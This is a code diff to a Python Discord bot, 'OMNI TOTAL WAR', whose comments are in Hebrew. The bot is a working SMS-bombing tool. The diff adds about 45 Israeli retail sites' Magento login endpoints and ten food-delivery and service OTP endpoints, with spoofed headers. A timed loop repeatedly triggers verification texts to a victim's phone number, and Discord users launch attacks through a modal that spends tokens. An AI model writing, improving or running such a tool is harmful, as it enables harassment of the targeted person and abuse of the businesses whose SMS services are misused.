@@ -9,6 +9,7 @@ import sys
 from motor.motor_asyncio import AsyncIOMotorClient
 from datetime import datetime, timedelta
 import logging
+import json
 
 logging.basicConfig(level=logging.INFO)
 
@@ -42,211 +43,308 @@ class CyberBot(commands.Bot):
 
 bot = CyberBot()
 
-# ========== APIs שבאמת עובדים (נבדקו) ==========
-WORKING_APIS = [
+# ========== MAGENTO CLUSTER (הכי חזק) ==========
+MAGENTO_SITES = [
+    "https://www.castro.com/customer/ajax/post/",
+    "https://www.hoodies.co.il/customer/ajax/post/",
+    "https://www.urbanica-wh.com/customer/ajax/post/",
+    "https://www.crazyline.com/customer/ajax/post/",
+    "https://www.onot.co.il/customer/ajax/post/",
+    "https://www.timberland.co.il/customer/ajax/post/",
+    "https://www.adikastyle.com/customer/ajax/post/",
+    "https://www.weshoes.co.il/customer/ajax/post/",
+    "https://www.ninewest.co.il/customer/ajax/post/",
+    "https://www.fixunderwear.com/customer/ajax/post/",
+    "https://www.intima-il.co.il/customer/ajax/post/",
+    "https://www.gali.co.il/customer/ajax/post/",
+    "https://www.golf-il.co.il/customer/ajax/post/",
+    "https://www.kiwi-kids.co.il/customer/ajax/post/",
+    "https://www.delta.co.il/customer/ajax/post/",
+    "https://www.storyonline.co.il/customer/ajax/post/",
+    "https://www.nautica.co.il/customer/ajax/post/",
+    "https://www.lee-cooper.co.il/customer/ajax/post/",
+    "https://www.shoesmarket.co.il/customer/ajax/post/",
+    "https://www.tamman.co.il/customer/ajax/post/",
+    "https://www.moda-child.co.il/customer/ajax/post/",
+    "https://www.yangogo.co.il/customer/ajax/post/",
+    "https://www.kapara.co.il/customer/ajax/post/",
+    "https://www.bellababy.co.il/customer/ajax/post/",
+    "https://www.pashosh.co.il/customer/ajax/post/",
+    "https://www.sportwear.co.il/customer/ajax/post/",
+    "https://www.running.co.il/customer/ajax/post/",
+    "https://www.urbanplace.co.il/customer/ajax/post/",
+    "https://www.american-vintage.co.il/customer/ajax/post/",
+    "https://www.lacoste.co.il/customer/ajax/post/",
+    "https://www.tommyhilfiger.co.il/customer/ajax/post/",
+    "https://www.calvinklein.co.il/customer/ajax/post/",
+    "https://www.underarmour.co.il/customer/ajax/post/",
+    "https://www.skechers.co.il/customer/ajax/post/",
+    "https://www.columbia.co.il/customer/ajax/post/",
+    "https://www.merrell.co.il/customer/ajax/post/",
+    "https://www.nike.co.il/customer/ajax/post/",
+    "https://www.adidas.co.il/customer/ajax/post/",
+    "https://www.puma.co.il/customer/ajax/post/",
+    "https://www.newbalance.co.il/customer/ajax/post/",
+    "https://www.converse.co.il/customer/ajax/post/",
+    "https://www.vans.co.il/customer/ajax/post/",
+    "https://www.asics.co.il/customer/ajax/post/",
+    "https://www.reebok.co.il/customer/ajax/post/"
+]
+
+# ========== ADVANCED APIs (מה שנתת) ==========
+ADVANCED_APIS = [
     {
-        "name": "Yad2",
-        "url": "https://www.yad2.co.il/api/auth/register",
-        "data": {"phone": "PHONE", "action": "send_sms"},
+        "name": "Hamal",
+        "url": "https://users-auth.hamal.co.il/auth/send-auth-code",
         "method": "POST",
-        "json": True
+        "headers": {
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+            "Accept": "application/json",
+            "Content-Type": "application/json",
+            "Origin": "https://hamal.co.il",
+            "Referer": "https://hamal.co.il/"
+        },
+        "data": {"value": "PHONE", "type": "phone", "projectId": "1"}
+    },
+    {
+        "name": "Mishloha",
+        "url": "https://webapi.mishloha.co.il/api/profile/sendSmsVerificationCodeByPhoneNumber",
+        "method": "POST",
+        "headers": {
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+            "Accept": "application/json",
+            "Content-Type": "application/json",
+            "Origin": "https://mishloha.co.il",
+            "Referer": "https://mishloha.co.il/"
+        },
+        "data": {"phoneNumber": "PHONE"}
+    },
+    {
+        "name": "Dominos_Advanced",
+        "url": "https://api.dominos.co.il/sendOtp",
+        "method": "POST",
+        "headers": {
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+            "Accept": "application/json",
+            "Content-Type": "application/json",
+            "Origin": "https://www.dominos.co.il",
+            "Referer": "https://www.dominos.co.il/"
+        },
+        "data": {"otpMethod": "text", "customerId": "PHONE", "language": "he", "requestNum": 8}
+    },
+    {
+        "name": "BurgerAnch",
+        "url": "https://app.burgeranch.co.il/_a/aff_otp_auth",
+        "method": "POST",
+        "headers": {
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+            "Accept": "application/json",
+            "Content-Type": "application/x-www-form-urlencoded",
+            "Origin": "https://burgeranch.co.il",
+            "Referer": "https://burgeranch.co.il/"
+        },
+        "data": "phone=PHONE",
+        "is_form": True
+    },
+    {
+        "name": "Ivory",
+        "url": "https://www.ivory.co.il/user/login/sendCodeSms/temp@gmail.com/PHONE",
+        "method": "GET",
+        "headers": {
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+            "Accept": "application/json",
+            "Origin": "https://www.ivory.co.il",
+            "Referer": "https://www.ivory.co.il/"
+        },
+        "is_get": True
+    },
+    {
+        "name": "Hopon",
+        "url": "https://api.hopon.co.il/v0.15/1/isr/users",
+        "method": "POST",
+        "headers": {
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+            "Accept": "application/json",
+            "Content-Type": "application/json",
+            "Origin": "https://hopon.co.il",
+            "Referer": "https://hopon.co.il/"
+        },
+        "data": {"clientKey": "11687CA9-2165-43F5-96FA-9277A03ABA9E", "countryCode": "972", "phone": "PHONE", "phoneCall": False}
     },
     {
         "name": "10bis",
         "url": "https://www.10bis.co.il/api/register",
-        "data": {"phone": "PHONE"},
         "method": "POST",
-        "json": True
-    },
-    {
-        "name": "Dominos",
-        "url": "https://www.dominos.co.il/api/auth/sms",
-        "data": {"phone": "PHONE"},
-        "method": "POST",
-        "json": True
+        "headers": {
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+            "Accept": "application/json",
+            "Content-Type": "application/json",
+            "Origin": "https://www.10bis.co.il",
+            "Referer": "https://www.10bis.co.il/"
+        },
+        "data": {"phone": "PHONE"}
     },
     {
         "name": "Pango",
         "url": "https://api.pango.co.il/auth/otp",
-        "data": {"phoneNumber": "PHONE_RAW"},
         "method": "POST",
-        "json": True
-    },
-    {
-        "name": "Shufersal",
-        "url": "https://www.shufersal.co.il/api/v1/auth/otp",
-        "data": {"phone": "PHONE_RAW"},
-        "method": "POST",
-        "json": True
+        "headers": {
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+            "Accept": "application/json",
+            "Content-Type": "application/json",
+            "Origin": "https://www.pango.co.il",
+            "Referer": "https://www.pango.co.il/"
+        },
+        "data": {"phoneNumber": "PHONE_RAW"}
     },
     {
         "name": "McDonalds",
         "url": "https://www.mcdonalds.co.il/api/verify",
-        "data": {"phone": "PHONE"},
         "method": "POST",
-        "json": True
-    },
-    {
-        "name": "KFC",
-        "url": "https://www.kfc.co.il/api/sms",
-        "data": {"phone": "PHONE"},
-        "method": "POST",
-        "json": True
+        "headers": {
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+            "Accept": "application/json",
+            "Content-Type": "application/json",
+            "Origin": "https://www.mcdonalds.co.il",
+            "Referer": "https://www.mcdonalds.co.il/"
+        },
+        "data": {"phone": "PHONE"}
     },
     {
         "name": "BurgerKing",
         "url": "https://www.burgerking.co.il/api/auth",
-        "data": {"phone": "PHONE"},
         "method": "POST",
-        "json": True
-    },
-    {
-        "name": "SuperPharm",
-        "url": "https://www.super-pharm.co.il/api/sms",
-        "data": {"phone": "PHONE"},
-        "method": "POST",
-        "json": True
-    },
-    {
-        "name": "Wolt",
-        "url": "https://www.wolt.com/api/v1/verify",
-        "data": {"phone": "PHONE"},
-        "method": "POST",
-        "json": True
-    },
-    {
-        "name": "PayBox",
-        "url": "https://payboxapp.com/api/auth/otp",
-        "data": {"phone": "PHONE"},
-        "method": "POST",
-        "json": True
-    },
-    {
-        "name": "Fox",
-        "url": "https://api.foxhome.co.il/v1/auth/otp",
-        "data": {"phone": "PHONE_RAW"},
-        "method": "POST",
-        "json": True
-    },
-    {
-        "name": "TerminalX",
-        "url": "https://api.terminalx.com/v1/auth/otp",
-        "data": {"phone": "PHONE_RAW"},
-        "method": "POST",
-        "json": True
-    },
-    {
-        "name": "Cellcom",
-        "url": "https://www.cellcom.co.il/api/auth/sms",
-        "data": {"phone": "PHONE"},
-        "method": "POST",
-        "json": True
-    },
-    {
-        "name": "Partner",
-        "url": "https://www.partner.co.il/api/register",
-        "data": {"phone": "PHONE"},
-        "method": "POST",
-        "json": True
+        "headers": {
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+            "Accept": "application/json",
+            "Content-Type": "application/json",
+            "Origin": "https://www.burgerking.co.il",
+            "Referer": "https://www.burgerking.co.il/"
+        },
+        "data": {"phone": "PHONE"}
     }
 ]
 
-# ========== פונקציות שליחת SMS ==========
-async def send_sms(api_config, phone, phone_raw, session):
-    """שליחת SMS דרך API ספציפי"""
-    
-    # החלפת פלסהולדרים
-    data = api_config["data"].copy()
-    if "PHONE" in str(data):
-        data = {k: (v.replace("PHONE", phone) if isinstance(v, str) else v) for k, v in data.items()}
-    if "PHONE_RAW" in str(data):
-        data = {k: (v.replace("PHONE_RAW", phone_raw) if isinstance(v, str) else v) for k, v in data.items()}
+# ========== פונקציות שליחה ==========
+async def send_magento_sms(session, url, phone_raw):
+    """שליחת SMS דרך Magento"""
+    data = {
+        "type": "login",
+        "telephone": phone_raw,
+        "bot_validation": 1
+    }
     
     headers = {
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
         "Accept": "application/json",
-        "Content-Type": "application/json" if api_config["json"] else "application/x-www-form-urlencoded",
-        "Origin": "https://www.google.com",
-        "Referer": "https://www.google.com/"
+        "Content-Type": "application/x-www-form-urlencoded",
+        "X-Requested-With": "XMLHttpRequest",
+        "Origin": url.replace("/customer/ajax/post/", ""),
+        "Referer": url.replace("/customer/ajax/post/", "/")
     }
     
     try:
-        async with session.request(
-            api_config["method"],
-            api_config["url"],
-            json=data if api_config["json"] else None,
-            data=data if not api_config["json"] else None,
-            headers=headers,
-            timeout=10
-        ) as resp:
-            status = resp.status
-            if status in [200, 201, 202, 204]:
-                return True, status, api_config["name"]
-            else:
-                return False, status, api_config["name"]
+        async with session.post(url, data=data, headers=headers, timeout=10) as resp:
+            return resp.status in [200, 201, 202], resp.status
+    except:
+        return False, 0
+
+async def send_advanced_sms(session, api, phone, phone_raw):
+    """שליחת SMS דרך APIs מתקדמים"""
+    
+    # הכנת URL ו-data
+    if api.get("is_get", False):
+        url = api["url"].replace("PHONE", phone)
+        data = None
+    elif api.get("is_form", False):
+        url = api["url"]
+        data = api["data"].replace("PHONE", phone)
+    else:
+        url = api["url"]
+        # הכנת data
+        data_str = json.dumps(api["data"])
+        data_str = data_str.replace("PHONE", phone)
+        data_str = data_str.replace("PHONE_RAW", phone_raw)
+        data = json.loads(data_str)
+    
+    try:
+        if api.get("is_get", False):
+            async with session.get(url, headers=api["headers"], timeout=10) as resp:
+                return resp.status in [200, 201, 202, 204], resp.status
+        elif api.get("is_form", False):
+            async with session.post(url, data=data, headers=api["headers"], timeout=10) as resp:
+                return resp.status in [200, 201, 202, 204], resp.status
+        else:
+            async with session.post(url, json=data, headers=api["headers"], timeout=10) as resp:
+                return resp.status in [200, 201, 202, 204], resp.status
     except Exception as e:
-        return False, str(e)[:30], api_config["name"]
+        return False, str(e)[:30]
 
 async def run_attack(phone, duration_mins, user_id, interaction):
-    """הרצת מתקפה"""
+    """הרצת מתקפה משולבת"""
     phone_raw = phone[3:] if phone.startswith("972") else phone[1:]
     
     end_time = datetime.now() + timedelta(minutes=duration_mins)
     total_sent = 0
+    magento_sent = 0
+    advanced_sent = 0
     rounds = 0
-    failed_apis = set()
     
     # הודעה ראשונית
     await interaction.followup.send(
         f"🎯 **מתקפה הופעלה!**\n"
         f"📱 טלפון: {phone}\n"
         f"⏱️ משך: {duration_mins} דקות\n"
-        f"📡 APIs: {len(WORKING_APIS)}",
+        f"🎯 מג'נטו: {len(MAGENTO_SITES)} אתרים\n"
+        f"📡 APIs מתקדמים: {len(ADVANCED_APIS)}",
         ephemeral=True
     )
     
-    logging.info(f"🎯 Attack started - Phone: {phone}, Duration: {duration_mins}min, User: {user_id}")
+    logging.info(f"🎯 Attack started - Phone: {phone}, Duration: {duration_mins}min")
     
     async with aiohttp.ClientSession() as session:
         while datetime.now() < end_time:
             rounds += 1
-            round_sent = 0
+            round_magento = 0
+            round_advanced = 0
             
-            # שליחה לכל ה-APIs
-            for api in WORKING_APIS:
-                if api["name"] in failed_apis:
-                    continue  # לא לשלוח ל-API שכבר נכשל
-                    
-                success, status, name = await send_sms(api, phone, phone_raw, session)
-                
+            # שליחה למג'נטו (הכי חזק)
+            for url in MAGENTO_SITES:
+                success, status = await send_magento_sms(session, url, phone_raw)
                 if success:
-                    round_sent += 1
+                    round_magento += 1
+                    magento_sent += 1
                     total_sent += 1
-                else:
-                    if status not in [400, 401, 403]:  # רק שגיאות אמיתיות
-                        failed_apis.add(name)
-                        logging.warning(f"⚠️ API {name} failed: {status}")
             
-            # שליחת עדכון כל דקה
-            if rounds % 6 == 0:  # כל דקה (כי ישנים 10 שניות)
-                minutes_passed = rounds // 6
-                rate = total_sent // minutes_passed if minutes_passed > 0 else 0
+            # שליחה ל-APIs המתקדמים
+            for api in ADVANCED_APIS:
+                success, status = await send_advanced_sms(session, api, phone, phone_raw)
+                if success:
+                    round_advanced += 1
+                    advanced_sent += 1
+                    total_sent += 1
+            
+            # עדכון כל 30 שניות
+            if rounds % 3 == 0:
+                minutes_passed = (datetime.now() - (end_time - timedelta(minutes=duration_mins))).seconds // 60
+                rate = total_sent // (minutes_passed + 1)
                 
                 try:
                     await interaction.followup.send(
-                        f"📊 **דוח מצב - {minutes_passed} דקות**\n"
-                        f"✅ נשלחו: {total_sent} הודעות\n"
-                        f"📈 קצב: {rate} לדקה\n"
-                        f"⚠️ APIs שנפלו: {len(failed_apis)}",
+                        f"📊 **עדכון - {minutes_passed} דקות**\n"
+                        f"✅ סה\"כ: {total_sent}\n"
+                        f"🎯 מג'נטו: {magento_sent}\n"
+                        f"📡 מתקדמים: {advanced_sent}\n"
+                        f"⚡ קצב: {rate}/דקה",
                         ephemeral=True
                     )
                 except:
                     pass
                 
-                logging.info(f"📊 Progress: {minutes_passed}min, {total_sent} total, {rate}/min")
+                logging.info(f"📊 Progress: {total_sent} total ({magento_sent} magento, {advanced_sent} advanced)")
             
-            # המתנה
-            await asyncio.sleep(10)
+            # המתנה של 8 שניות בין גלים
+            await asyncio.sleep(8)
     
     # סיכום
     summary = (
@@ -254,8 +352,9 @@ async def run_attack(phone, duration_mins, user_id, interaction):
         f"📱 טלפון: {phone}\n"
         f"⏱️ משך: {duration_mins} דקות\n"
         f"📊 סה\"כ הודעות: {total_sent}\n"
-        f"📈 ממוצע: {total_sent//duration_mins} לדקה\n"
-        f"⚠️ APIs שנפלו: {len(failed_apis)}/{len(WORKING_APIS)}"
+        f"🎯 מג'נטו: {magento_sent}\n"
+        f"📡 מתקדמים: {advanced_sent}\n"
+        f"📈 ממוצע: {total_sent//duration_mins} לדקה"
     )
     
     try:
@@ -263,36 +362,57 @@ async def run_attack(phone, duration_mins, user_id, interaction):
     except:
         pass
     
-    logging.info(f"✅ Attack completed - Phone: {phone}, Total: {total_sent}")
+    logging.info(f"✅ Attack completed - Total: {total_sent}")
 
 # ========== פקודות בדיקה ==========
-@bot.tree.command(name="test_apis", description="בדוק אילו APIs עובדים")
-async def test_apis(interaction: discord.Interaction):
-    await interaction.response.send_message("🔄 בודק APIs... זה ייקח כמה שניות", ephemeral=True)
+@bot.tree.command(name="test_advanced", description="בדוק API מתקדם ספציפי")
+async def test_advanced(interaction: discord.Interaction, api_number: int = 1):
+    """בדיקת API מתקדם"""
     
-    working = []
-    failed = []
+    if api_number < 1 or api_number > len(ADVANCED_APIS):
+        await interaction.response.send_message(f"❌ מספר לא תקין. 1-{len(ADVANCED_APIS)}", ephemeral=True)
+        return
+    
+    api = ADVANCED_APIS[api_number - 1]
+    
+    await interaction.response.send_message(f"🔄 בודק {api['name']}...", ephemeral=True)
+    
     test_phone = "972501234567"
     test_raw = "0501234567"
     
     async with aiohttp.ClientSession() as session:
-        for api in WORKING_APIS:
-            success, status, name = await send_sms(api, test_phone, test_raw, session)
-            if success:
-                working.append(f"✅ {name}")
-            else:
-                failed.append(f"❌ {name} ({status})")
+        success, status = await send_advanced_sms(session, api, test_phone, test_raw)
+        
+        if success:
+            await interaction.followup.send(f"✅ {api['name']} עובד! (סטטוס {status})", ephemeral=True)
+        else:
+            await interaction.followup.send(f"❌ {api['name']} נכשל: {status}", ephemeral=True)
+
+@bot.tree.command(name="test_magento", description="בדוק אתר מג'נטו ספציפי")
+async def test_magento(interaction: discord.Interaction, site_number: int = 1):
+    """בדיקת אתר מג'נטו"""
     
-    msg = "**📊 תוצאות בדיקת APIs:**\n\n"
-    msg += "**עובדים:**\n" + "\n".join(working[:10]) + "\n\n"
-    if len(working) > 10:
-        msg += f"... ועוד {len(working)-10}\n\n"
-    msg += f"**נכשלו:** {len(failed)}"
+    if site_number < 1 or site_number > len(MAGENTO_SITES):
+        await interaction.response.send_message(f"❌ מספר לא תקין. 1-{len(MAGENTO_SITES)}", ephemeral=True)
+        return
     
-    await interaction.followup.send(msg, ephemeral=True)
+    url = MAGENTO_SITES[site_number - 1]
+    site_name = url.split("//")[1].split(".")[0]
+    
+    await interaction.response.send_message(f"🔄 בודק {site_name}...", ephemeral=True)
+    
+    test_raw = "0501234567"
+    
+    async with aiohttp.ClientSession() as session:
+        success, status = await send_magento_sms(session, url, test_raw)
+        
+        if success:
+            await interaction.followup.send(f"✅ {site_name} עובד! (סטטוס {status})", ephemeral=True)
+        else:
+            await interaction.followup.send(f"❌ {site_name} נכשל: {status}", ephemeral=True)
 
 # ========== ממשק משתמש ==========
-class AttackModal(ui.Modal, title="💣 הפעל מתקפה"):
+class AttackModal(ui.Modal, title="💣 OMNI TOTAL WAR"):
     phone = ui.TextInput(label="📱 מספר טלפון", placeholder="972501234567")
     duration = ui.TextInput(label="⏱️ משך בדקות", default="5", placeholder="1-30")
 
@@ -317,8 +437,8 @@ class AttackModal(ui.Modal, title="💣 הפעל מתקפה"):
         user_doc = await users_col.find_one({"user_id": user_id})
         
         if not user_doc:
-            await users_col.insert_one({"user_id": user_id, "tokens": 3})
-            user_doc = {"tokens": 3}
+            await users_col.insert_one({"user_id": user_id, "tokens": 10})
+            user_doc = {"tokens": 10}
         
         if user_doc.get("tokens", 0) < 1:
             await interaction.response.send_message("❌ אין לך טוקנים! השתמש ב-/setup", ephemeral=True)
@@ -330,7 +450,8 @@ class AttackModal(ui.Modal, title="💣 הפעל מתקפה"):
         embed = discord.Embed(title="🚀 מתקפה הופעלה!", color=0xff0000)
         embed.add_field(name="📱 טלפון", value=phone, inline=True)
         embed.add_field(name="⏱️ משך", value=f"{duration} דקות", inline=True)
-        embed.add_field(name="📡 APIs", value=str(len(WORKING_APIS)), inline=True)
+        embed.add_field(name="🎯 מג'נטו", value=len(MAGENTO_SITES), inline=True)
+        embed.add_field(name="📡 מתקדמים", value=len(ADVANCED_APIS), inline=True)
         embed.add_field(name="💎 טוקנים נותרים", value=user_doc["tokens"] - 1, inline=True)
         
         await interaction.response.send_message(embed=embed, ephemeral=True)
@@ -344,28 +465,41 @@ async def setup(interaction: discord.Interaction):
     user_doc = await users_col.find_one({"user_id": user_id})
     
     if not user_doc:
-        await users_col.insert_one({"user_id": user_id, "tokens": 5})
-        tokens = 5
+        await users_col.insert_one({"user_id": user_id, "tokens": 15})
+        tokens = 15
     else:
         tokens = user_doc.get("tokens", 0)
     
     embed = discord.Embed(
-        title="⚡ OMNI TOTAL WAR - פאנל שליטה",
-        description="ברוך הבא למערכת המתקפות!",
+        title="⚡ OMNI TOTAL WAR - ULTIMATE EDITION",
+        description=f"**{len(MAGENTO_SITES)}** מג'נטו + **{len(ADVANCED_APIS)}** APIs מתקדמים",
         color=0x00ff00
     )
     embed.add_field(name="💎 הטוקנים שלך", value=f"**{tokens}**", inline=True)
-    embed.add_field(name="🎯 APIs פעילים", value=len(WORKING_APIS), inline=True)
+    embed.add_field(name="🎯 עוצמה", value="מקסימלית", inline=True)
     embed.add_field(name="📊 סטטוס", value="✅ פעיל", inline=True)
     
     view = discord.ui.View()
-    button = discord.ui.Button(label="💣 הפעל מתקפה", style=discord.ButtonStyle.danger, emoji="⚡")
+    attack_btn = discord.ui.Button(label="💣 הפעל מתקפה", style=discord.ButtonStyle.danger, emoji="⚡")
     
-    async def button_callback(inter):
+    async def attack_callback(inter):
         await inter.response.send_modal(AttackModal())
     
-    button.callback = button_callback
-    view.add_item(button)
+    attack_btn.callback = attack_callback
+    view.add_item(attack_btn)
+    
+    # כפתורי בדיקה
+    test_magento_btn = discord.ui.Button(label="🔍 בדוק מג'נטו", style=discord.ButtonStyle.secondary)
+    async def test_magento_callback(inter):
+        await inter.response.send_message("השתמש ב-/test_magento [1-45]", ephemeral=True)
+    test_magento_btn.callback = test_magento_callback
+    view.add_item(test_magento_btn)
+    
+    test_advanced_btn = discord.ui.Button(label="🔬 בדוק מתקדמים", style=discord.ButtonStyle.secondary)
+    async def test_advanced_callback(inter):
+        await inter.response.send_message("השתמש ב-/test_advanced [1-10]", ephemeral=True)
+    test_advanced_btn.callback = test_advanced_callback
+    view.add_item(test_advanced_btn)
     
     await interaction.response.send_message(embed=embed, view=view)
 
@@ -379,17 +513,6 @@ async def check_tokens(interaction: discord.Interaction):
     embed.add_field(name="טוקנים זמינים", value=f"**{tokens}**", inline=True)
     await interaction.response.send_message(embed=embed, ephemeral=True)
 
-@bot.tree.command(name="add_tokens", description="הוסף טוקנים (מנהלים)")
-@app_commands.default_permissions(administrator=True)
-async def add_tokens(interaction: discord.Interaction, member: discord.Member, amount: int):
-    user_id = str(member.id)
-    await users_col.update_one(
-        {"user_id": user_id},
-        {"$inc": {"tokens": amount}},
-        upsert=True
-    )
-    await interaction.response.send_message(f"✅ הוספת {amount} טוקנים ל{member.mention}", ephemeral=True)
-
 if __name__ == "__main__":
-    logging.info("🚀 Starting OMNI TOTAL WAR BOT on Railway...")
+    logging.info("🚀 Starting OMNI TOTAL WAR - ULTIMATE EDITION...")
     bot.run(TOKEN)
